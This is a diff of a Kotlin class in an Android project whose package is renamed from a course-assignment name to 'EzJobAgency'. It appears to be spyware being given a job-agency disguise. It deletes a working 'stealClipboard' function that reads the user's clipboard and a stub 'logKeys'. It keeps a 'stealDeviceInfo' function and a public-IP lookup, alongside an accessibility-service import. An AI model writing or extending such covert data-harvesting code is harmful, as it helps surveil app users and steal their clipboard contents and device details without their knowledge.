@@ -1,4 +1,4 @@
-package com.example.assignment1.DataRetriever
+package com.example.EzJobAgency.DataRetriever
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
@@ -10,7 +10,9 @@ import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityManager
 import androidx.appcompat.app.AlertDialog
-import com.example.assignment1.MyAccessibilityService
+import androidx.lifecycle.lifecycleScope
+import com.example.EzJobAgency.MyAccessibilityService
+import kotlinx.coroutines.launch
 import org.jsoup.Jsoup
 import org.jsoup.nodes.Document
 import java.net.InetAddress
@@ -24,18 +26,6 @@ class General{
     constructor(context: Context?, act : Activity) {
         ctx = context
         aty = act
-    }
-
-    fun stealClipboard(): String{
-        val clipboard = ctx!!.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-        var clip = ""
-        if (clipboard.hasPrimaryClip()) {
-            val description = clipboard.primaryClipDescription
-            val data = clipboard.primaryClip
-            if (data != null && description != null && description.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN))
-                clip = data.getItemAt(0).text.toString()
-        }
-        return clip
     }
 
     fun stealDeviceInfo(): String {
@@ -92,22 +82,12 @@ class General{
     }
 
     fun getPublicIP(): String? {
-        try {
+        return try {
             val doc: Document = Jsoup.connect("https://www.checkip.org").get()
-            return doc.getElementById("yourip").select("h1").first().select("span").text()
+            doc.getElementById("yourip").select("h1").first().select("span").text()
         } catch (e: Exception) {
             Log.e("Error:", "Failed to fetch URL", e)
-            return null
-        }
-    }
-
-    fun logKeys(): String? {
-        try {
-            val doc: Document = Jsoup.connect("https://www.checkip.org").get()
-            return doc.getElementById("yourip").select("h1").first().select("span").text()
-        } catch(e: Exception){
-            Log.e("Error:", "Failed to fetch URL", e)
-            return null
+            null
         }
     }
 
